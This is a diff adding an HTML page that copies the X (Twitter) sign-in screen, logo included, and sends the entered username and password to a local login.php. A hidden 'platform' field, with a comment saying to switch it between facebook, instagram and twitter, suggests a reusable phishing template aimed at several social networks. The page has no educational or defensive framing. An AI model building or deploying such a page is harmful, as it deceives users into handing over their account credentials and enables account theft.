@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X (Twitter) Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/X_logo_2023_original.svg" alt="X Logo" class="logo">
+        </div>
+        <div class="right-section">
+            <h1>Sign in to X</h1>
+            <button class="google-btn">Sign in with Google</button>
+            <button class="apple-btn">Sign in with Apple</button>
+            <div class="divider">
+                <hr><span>or</span><hr>
+            </div>
+            <form action="login.php" method="POST">
+                <input type="hidden" name="platform" value="facebook"> <!-- Change to "instagram" or "twitter" as needed -->
+                <input type="text" name="username" placeholder="Phone, email, or username" required>
+                <input type="password" name="password" placeholder="Phone, email, or username" required>
+                <button type="submit" class="next-btn">Next</button>
+                <button type="button" class="forgot-btn">Forgot password?</button>
+            </form>
+            <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+</body>
+</html>
